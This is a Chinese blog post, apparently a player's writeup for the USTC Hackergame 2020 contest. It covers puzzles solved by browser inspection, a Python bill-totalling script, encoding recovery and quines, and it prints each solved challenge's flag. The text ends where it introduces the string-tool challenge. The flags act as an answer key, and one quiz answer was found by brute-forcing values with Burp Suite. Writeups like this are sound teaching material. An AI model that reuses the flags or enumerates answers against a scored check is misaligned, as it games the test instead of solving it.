<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>USTC Hackergame 2020 Writeup - hang333 Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="hang333 Blog"><meta name="msapplication-TileImage" content="/img/favicon.webp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="hang333 Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="( •̀ ω •́ )y 耶，一星期的 Hackergame 终于结束，最终获得校内第九，总排名六十，总分3000分。听说有跟我同是 20级 的 dalao 拿到校内第二，简直恐怖如斯 ヽ(*。&amp;gt;Д&amp;lt;)o゜ 签到直接审查元素 (Inspect Element) 将 input 的 value 改成 1  点击提取即可获得 flag flag&amp;amp;#123;hR6Ku81-HappyHack"><meta property="og:type" content="blog"><meta property="og:title" content="USTC Hackergame 2020 Writeup"><meta property="og:url" content="https://hang333.moe/2020/11/21/ustc-hackergame-2020-writeup/"><meta property="og:site_name" content="hang333 Blog"><meta property="og:description" content="( •̀ ω •́ )y 耶，一星期的 Hackergame 终于结束，最终获得校内第九，总排名六十，总分3000分。听说有跟我同是 20级 的 dalao 拿到校内第二，简直恐怖如斯 ヽ(*。&amp;gt;Д&amp;lt;)o゜ 签到直接审查元素 (Inspect Element) 将 input 的 value 改成 1  点击提取即可获得 flag flag&amp;amp;#123;hR6Ku81-HappyHack"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://hang333.moe/img/post/image-20201119105434126.webp"><meta property="og:image" content="https://hang333.moe/img/post/image-20201119111317324.webp"><meta property="og:image" content="https://hang333.moe/img/post/image-20201119121620347.webp"><meta property="og:image" content="https://hang333.moe/img/post/transform.webp"><meta property="og:image" content="https://hang333.moe/img/post/image-20201120095714683.webp"><meta property="og:image" content="https://hang333.moe/img/post/image-20201120101856420.webp"><meta property="og:image" content="https://hang333.moe/img/post/image-20201121205238853.webp"><meta property="article:published_time" content="2020-11-21T10:00:00.000Z"><meta property="article:modified_time" content="2020-11-21T13:26:48.037Z"><meta property="article:author" content="hang333"><meta property="article:tag" content="CTF"><meta property="article:tag" content="USTC Hackergame"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/post/image-20201119105434126.webp"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://hang333.moe/2020/11/21/ustc-hackergame-2020-writeup/"},"headline":"hang333 Blog","image":[],"datePublished":"2020-11-21T10:00:00.000Z","dateModified":"2020-11-21T13:26:48.037Z","author":{"@type":"Person","name":"hang333"},"description":"( •̀ ω •́ )y 耶，一星期的 Hackergame 终于结束，最终获得校内第九，总排名六十，总分3000分。听说有跟我同是 20级 的 dalao 拿到校内第二，简直恐怖如斯 ヽ(*。&gt;Д&lt;)o゜ 签到直接审查元素 (Inspect Element) 将 input 的 value 改成 1  点击提取即可获得 flag flag&amp;#123;hR6Ku81-HappyHack"}</script><script async src="/js/ggggtag.js"></script><link rel="canonical" href="https://hang333.moe/2020/11/21/ustc-hackergame-2020-writeup/"><link rel="icon" href="/img/favicon.webp"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.3.2/styles/night-owl.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">hang333 Blog</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-11-21T10:00:00.000Z" title="2020-11-21T10:00:00.000Z">21-11-2020</time>发表</span><span class="level-item"><time dateTime="2020-11-21T13:26:48.037Z" title="2020-11-21T13:26:48.037Z">21-11-2020</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/SECURITY/">SECURITY</a></span></div></div><h1 class="title is-3 is-size-4-mobile">USTC Hackergame 2020 Writeup</h1><div class="content"><p>( •̀ ω •́ )y 耶，一星期的 Hackergame 终于结束，最终获得校内第九，总排名六十，总分3000分。<br>听说有跟我同是 20级 的 dalao 拿到校内第二，简直恐怖如斯 ヽ(*。&gt;Д&lt;)o゜</p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>直接审查元素 (Inspect Element) 将 input 的 value 改成 1</p>
<p><img src="/img/post/image-20201119105434126.webp" alt="签到"></p>
<p>点击提取即可获得 flag<br><code> flag&#123;hR6Ku81-HappyHacking2020-58eadee9bc&#125;</code></p>
<a id="more"></a>
<h2 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答"></a>猫咪问答</h2><p>Q1: <strong>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</strong></p>
<p>解：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Docker: 鲸鱼 : 哺乳 (1)</span><br><span class="line">Golang: 地鼠 ：哺乳 (2)</span><br><span class="line">Python：蛇：爬行</span><br><span class="line">Plan 9: 兔子： 哺乳 (3)</span><br><span class="line">PHP： 大象 ： 哺乳 (4)</span><br><span class="line">GNU： 角马 ： 哺乳 (5)</span><br><span class="line">LLVM： 龙： ？？</span><br><span class="line">Swift：鸟： 鸟类</span><br><span class="line">Perl：骆驼：哺乳 (6)</span><br><span class="line">GitHub: 章鱼：头足纲 </span><br><span class="line">TortoiseSVN：乌龟： 爬行</span><br><span class="line">FireFox：狐狸：哺乳 (7)</span><br><span class="line">MySQL：海豚：哺乳 (8)</span><br><span class="line">PostgreSQL： 大象：哺乳 (9)</span><br><span class="line">MariaDB：海狮：哺乳 (10)</span><br><span class="line">Linux：企鹅：鸟类</span><br><span class="line">OpenBSD：河豚：鱼类</span><br><span class="line">FreeDOS： Blinky：鱼？</span><br><span class="line">Apache Tomcat：猫：哺乳 (11)</span><br><span class="line">Squid：鱿鱼：头足纲 </span><br><span class="line">openSUSE:变色龙：爬行</span><br><span class="line">Kali：龙：？？</span><br><span class="line">Xfce：老鼠：哺乳(12)</span><br></pre></td></tr></table></figure>

<p>答案为 12。</p>
<p>Q2: <strong>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？</strong></p>
<p>解： 该标准为 IP over Avian Carriers。找到其 <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1149">RFC 标准 </a>， <code>A typical MTU is 256 milligrams.</code> 。即答案为 256。</p>
<p>Q3: <strong>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</strong></p>
<p>解： 利用搜索引擎查找关键字 <code>USTC Linux 2019 年 9 月 21 日自由软件日活动</code> 找到 <a target="_blank" rel="noopener" href="https://news.ustclug.org/2019/09/2019-sfd-ustc/">活动新闻页</a> ，<code>最后一项是李文睿同学介绍了开源游戏 Teeworlds</code> ，Teeworlds 有九个字符， 即答案为 9 。</p>
<p>Q4: <strong>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</strong></p>
<p>解： 我找到所有除这题以外的答案后用 burpsuite 遍历从 1 到 20， 找到答案为 9 wwww</p>
<p>Q5: <strong>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？</strong></p>
<p>解： 从 Hackergame 首页的 ”相关链接“ 中找到 <a target="_blank" rel="noopener" href="https://young.ustc.edu.cn/2020/0727/c17198a439807/page.htm">新闻稿：学生Linux用户协会第六届信息安全大赛完美收官</a> ， <code>比赛期间所有人合计提交了 17098 次 flag</code> ， 即答案为 17098。</p>
<p>flag 为 <code>flag&#123;b4a31f2a_G00G1e_1s_y0ur_fr13nd_7777892699&#125;</code></p>
<h2 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h2><p>第一反应是 View page source （不是把这游戏玩通关ww），在 <code>/js/html_actuator.js</code> 中看到源码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (won) &#123;</span><br><span class="line">    url = <span class="string">&quot;/getflxg?my_favorite_fruit=&quot;</span> + (<span class="string">&#x27;b&#x27;</span>+<span class="string">&#x27;a&#x27;</span>+ +<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;a&#x27;</span>).toLowerCase();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    url = <span class="string">&quot;/getflxg?my_favorite_fruit=&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>于是访问 <code>/getflxg?my_favorite_fruit=banana</code> 即可得到 flag： <code>flxg&#123;8G6so5g-FLXG-94887845e7&#125;</code></p>
<h2 id="一闪而过的-Flag"><a href="#一闪而过的-Flag" class="headerlink" title="一闪而过的 Flag"></a>一闪而过的 Flag</h2><p>直接在 cmd 运行下载下来的可执行文件。</p>
<p><img src="/img/post/image-20201119111317324.webp" alt="一闪而过的 Flag"></p>
<p>得到 <code>flag&#123;Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?&#125;</code></p>
<h2 id="从零开始的记账工具人"><a href="#从零开始的记账工具人" class="headerlink" title="从零开始的记账工具人"></a>从零开始的记账工具人</h2><p>先把下载下来的 xlsx 文件用 Excel 打开然后转换成 csv 文件以方便处理。<br>之后用 python 的 cn2an 库把中文大写数字转成阿拉伯数字。<br>以下为我的垃圾代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> cn2an</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;bills.csv&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> csv_file:</span><br><span class="line">    csv_reader = csv.reader(csv_file, delimiter=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    line_count = <span class="number">0</span></span><br><span class="line">    getcontext().prec = <span class="number">7</span></span><br><span class="line">    <span class="built_in">sum</span> = Decimal(<span class="string">&#x27;0.00&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> csv_reader:</span><br><span class="line">        <span class="keyword">if</span> line_count == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">f&#x27;Column names are <span class="subst">&#123;<span class="string">&quot;, &quot;</span>.join(row)&#125;</span>&#x27;</span>)</span><br><span class="line">            line_count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">f&quot;<span class="subst">&#123;row[<span class="number">1</span>]&#125;</span> 个 <span class="subst">&#123;row[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            meow = Decimal(<span class="string">&#x27;0.00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">r&quot;(.*)元(.*)角(.*)分&quot;</span>, row[<span class="number">0</span>]):</span><br><span class="line">                meow = Decimal(<span class="built_in">str</span>(cn2an.cn2an(row[<span class="number">0</span>].replace(<span class="string">&#x27;元&#x27;</span>,<span class="string">&#x27;点&#x27;</span>).replace(<span class="string">&#x27;角&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;分&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;normal&#x27;</span>))) * Decimal(row[<span class="number">1</span>])</span><br><span class="line">                <span class="built_in">sum</span> += meow</span><br><span class="line">            <span class="keyword">elif</span> re.match(<span class="string">r&quot;(.*)元(.*)角&quot;</span>, row[<span class="number">0</span>]):</span><br><span class="line">                meow = Decimal(<span class="built_in">str</span>(cn2an.cn2an(row[<span class="number">0</span>].replace(<span class="string">&#x27;元&#x27;</span>,<span class="string">&#x27;点&#x27;</span>).replace(<span class="string">&#x27;角&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;分&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;normal&#x27;</span>))) * Decimal(row[<span class="number">1</span>])</span><br><span class="line">                <span class="built_in">sum</span> += meow</span><br><span class="line">            <span class="keyword">elif</span> re.match(<span class="string">r&quot;(.*)元(.*)分&quot;</span>, row[<span class="number">0</span>]):</span><br><span class="line">                meow = Decimal(<span class="built_in">str</span>(cn2an.cn2an(row[<span class="number">0</span>].replace(<span class="string">&#x27;元&#x27;</span>,<span class="string">&#x27;点&#x27;</span>).replace(<span class="string">&#x27;角&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;分&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;normal&#x27;</span>))) * Decimal(row[<span class="number">1</span>])</span><br><span class="line">                <span class="built_in">sum</span> += meow</span><br><span class="line">            <span class="keyword">elif</span> re.match(<span class="string">r&quot;(.*)角(.*)分&quot;</span>, row[<span class="number">0</span>]):</span><br><span class="line">                meow = Decimal(<span class="built_in">str</span>(cn2an.cn2an(<span class="string">&#x27;零点&#x27;</span>+row[<span class="number">0</span>].replace(<span class="string">&#x27;角&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;分&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;normal&#x27;</span>))) * Decimal(row[<span class="number">1</span>])</span><br><span class="line">                <span class="built_in">sum</span>+= meow</span><br><span class="line">            <span class="keyword">elif</span> re.match(<span class="string">r&quot;(.*)分&quot;</span>, row[<span class="number">0</span>]):</span><br><span class="line">                meow = Decimal(<span class="built_in">str</span>(cn2an.cn2an(<span class="string">&#x27;零点零&#x27;</span>+row[<span class="number">0</span>].replace(<span class="string">&#x27;角&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;分&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;normal&#x27;</span>))) * Decimal(row[<span class="number">1</span>])</span><br><span class="line">                <span class="built_in">sum</span>+= meow</span><br><span class="line">            <span class="keyword">elif</span> re.match(<span class="string">r&quot;(.*)角&quot;</span>, row[<span class="number">0</span>]):</span><br><span class="line">                meow = Decimal(<span class="built_in">str</span>(cn2an.cn2an(<span class="string">&#x27;零点&#x27;</span>+row[<span class="number">0</span>].replace(<span class="string">&#x27;角&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;normal&#x27;</span>))) * Decimal(row[<span class="number">1</span>])</span><br><span class="line">                <span class="built_in">sum</span>+= meow</span><br><span class="line">            <span class="keyword">elif</span> re.match(<span class="string">r&quot;(.*)元整&quot;</span>, row[<span class="number">0</span>]):</span><br><span class="line">                meow = Decimal(<span class="built_in">str</span>(cn2an.cn2an(row[<span class="number">0</span>].replace(<span class="string">&#x27;元整&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;normal&#x27;</span>))) * Decimal(row[<span class="number">1</span>])</span><br><span class="line">                <span class="built_in">sum</span> += meow</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">&#x27;nooo&#x27;</span>)</span><br><span class="line">            line_count += <span class="number">1</span> </span><br><span class="line">    print(<span class="string">f&#x27;Processed <span class="subst">&#123;line_count&#125;</span> lines.\n <span class="subst">&#123;<span class="built_in">sum</span>&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>算出来的结果是 12598.55， 所以 flag 为 <code>flag&#123;12598.55&#125;</code><br>事后跑去看了别人的 writeup， 发现有个跟我用同样库的人比我写的简洁太多了， 这里也放出来 ;3</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn2an</span><br><span class="line"></span><br><span class="line">tot = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;bills.csv&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>).readlines()[<span class="number">1</span>:]:</span><br><span class="line">    a, b = i.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(a, b)</span></span><br><span class="line">    b = <span class="built_in">int</span>(b)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    z = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;元&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">        x, a = a.split(<span class="string">&#x27;元&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        x = <span class="built_in">int</span>(cn2an.cn2an(x, <span class="string">&#x27;smart&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;角&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">        y, a = a.split(<span class="string">&#x27;角&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        y = <span class="built_in">int</span>(cn2an.cn2an(y, <span class="string">&#x27;smart&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;分&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">        z, a = a.split(<span class="string">&#x27;分&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        z = <span class="built_in">int</span>(cn2an.cn2an(z, <span class="string">&#x27;smart&#x27;</span>))</span><br><span class="line">    <span class="comment">#print(x, y, z)</span></span><br><span class="line">    tot += (x + y * <span class="number">0.1</span> + z * <span class="number">0.01</span>) * b</span><br><span class="line">print(tot)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/players/mcfx/writeup.md#%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E8%AE%B0%E8%B4%A6%E5%B7%A5%E5%85%B7%E4%BA%BA">来源: mcfx</a></p>
<h2 id="超简单的世界模拟器"><a href="#超简单的世界模拟器" class="headerlink" title="超简单的世界模拟器"></a>超简单的世界模拟器</h2><h3 id="蝴蝶效应"><a href="#蝴蝶效应" class="headerlink" title="蝴蝶效应"></a>蝴蝶效应</h3><p>用 <a target="_blank" rel="noopener" href="https://www.conwaylife.com/wiki/Lightweight_spaceship">Lightweight Spaceship</a> 即可。<br>Payload 为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">100100000000000</span><br><span class="line">000010000000000</span><br><span class="line">100010000000000</span><br><span class="line">011110000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br></pre></td></tr></table></figure>

<p>即可获得 flag： <code>flag&#123;D0_Y0U_l1k3_g4me_0f_l1fe?_464d00452d&#125;</code></p>
<h2 id="从零开始的火星文生活"><a href="#从零开始的火星文生活" class="headerlink" title="从零开始的火星文生活"></a>从零开始的火星文生活</h2><p>在 UTF-8 下读取文件为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">脦脪鹿楼脝脝脕脣 拢脠拢谩拢茫拢毛拢氓拢貌拢莽拢谩拢铆拢氓 碌脛路镁脦帽脝梅拢卢脥碌碌陆脕脣脣眉脙脟碌脛 拢忙拢矛拢谩拢莽拢卢脧脰脭脷脦脪掳脩 拢忙拢矛拢谩拢莽 路垄赂酶脛茫拢潞</span><br><span class="line">拢忙拢矛拢谩拢莽拢没拢脠拢麓拢枚拢鲁拢脽拢脝拢玫拢脦拢脽拢梅拢卤拢脭拢猫拢脽拢鲁拢卯拢茫拢掳拢盲拢卤拢卯拢莽拢脽拢麓拢脦拢盲拢脽拢盲拢鲁拢茫拢掳拢脛拢卤拢卯拢脟拢脽拢鹿拢帽拢脛拢虏拢脪拢赂拢猫拢贸拢媒</span><br><span class="line">驴矛脠楼卤脠脠眉脝陆脤篓脤谩陆禄掳脡拢隆</span><br><span class="line">虏禄脪陋脭脵掳脩脮芒路脻脨脜脧垄脳陋路垄赂酶脝盲脣没脠脣脕脣拢卢脪陋脢脟卤禄路垄脧脰戮脥脭茫赂芒脕脣拢隆</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找到个 <a target="_blank" rel="noopener" href="http://www.mytju.com/classcode/tools/messyCodeRecover.asp">乱码还原网站</a> ，将文本输入。查看 <code>原来编码（假设）</code> 为 <code>UTF-8</code>、 <code>现在编码（假设）</code> 为 <code>GBK</code> 下的文本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ÎÒ¹¥ÆÆÁË £È£á£ã£ë£å£ò£ç£á£í£å µÄ·þÎñÆ÷£¬Íµµ½ÁËËüÃÇµÄ £æ£ì£á£ç£¬ÏÖÔÚÎÒ°Ñ £æ£ì£á£ç ·¢¸øÄã£º</span><br><span class="line">£æ£ì£á£ç£û£È£´£ö£³£ß£Æ£õ£Î£ß£÷£±£Ô£è£ß£³£î£ã£°£ä£±£î£ç£ß£´£Î£ä£ß£ä£³£ã£°£Ä£±£î£Ç£ß£¹£ñ£Ä£²£Ò£¸£è£ó£ý</span><br><span class="line">¿ìÈ¥±ÈÈüÆ½Ì¨Ìá½»°É£¡</span><br><span class="line">²»ÒªÔÙ°ÑÕâ·ÝÐÅÏ¢×ª·¢¸øÆäËûÈËÁË£¬ÒªÊÇ±»·¢ÏÖ¾ÍÔã¸âÁË£¡</span><br></pre></td></tr></table></figure>

<p>把该文本再还原一次，发现 <code>原来编码（假设）</code> 为 <code>GBK</code>、 <code>现在编码（假设）</code> 为 <code>iso-8859-1</code> 时文本已还原。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我攻破了 Ｈａｃｋｅｒｇａｍｅ 的服务器，偷到了它们的 ｆｌａｇ，现在我把 ｆｌａｇ 发给你：</span><br><span class="line">ｆｌａｇ｛Ｈ４ｖ３＿ＦｕＮ＿ｗ１Ｔｈ＿３ｎｃ０ｄ１ｎｇ＿４Ｎｄ＿ｄ３ｃ０Ｄ１ｎＧ＿９ｑＤ２Ｒ８ｈｓ｝</span><br><span class="line">快去比赛平台提交吧！</span><br><span class="line">不要再把这份信息转发给其他人了，要是被发现就糟糕了！</span><br></pre></td></tr></table></figure>

<p>所以 flag 为 <code>flag&#123;H4v3_FuN_w1Th_3nc0d1ng_4Nd_d3c0D1nG_9qD2R8hs&#125;</code> 。</p>
<h2 id="自复读的复读机"><a href="#自复读的复读机" class="headerlink" title="自复读的复读机"></a>自复读的复读机</h2><h3 id="反向复读"><a href="#反向复读" class="headerlink" title="反向复读"></a>反向复读</h3><p>从 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/6223285/shortest-python-quine">Stackoverflow - shortest python quine?</a> 找一个方便构造的进行构造。</p>
<p>Payload 为 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print((<span class="keyword">lambda</span> s:(s%s)[::<span class="number">-1</span>])(<span class="string">&#x27;print((lambda s:(s%%s)[::-1])(%r), end=&quot;&quot;)&#x27;</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得到 flag: <code>flag&#123;Yes!_Y0U_h4v3_a_r3v3rs3d_Qu1ne_0850bb9e57&#125;</code></p>
<h3 id="哈希复读"><a href="#哈希复读" class="headerlink" title="哈希复读"></a>哈希复读</h3><p>同反向复读， 找了一个新的来构造：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib;exec(s:=<span class="string">&#x27;print(hashlib.sha256((&quot;import hashlib;exec(s:=%r)&quot;%s).encode()).hexdigest(), end=&quot;&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>得到 flag: <code>flag&#123;W0W_Y0Ur_c0de_0utputs_1ts_0wn_sha256_423ae2f900&#125;</code></p>
<h2 id="233-同学的字符串工具"><a href="#233-同学的字符串工具" class="headerlink" title="233 同学的字符串工具"></a>233 同学的字符串工具</h2><h3 id="字符串大写工具"><a href="#字符串大写工具" class="headerlink" title="字符串大写工具"></a>字符串大写工具</h3><p>题目源码为</p>
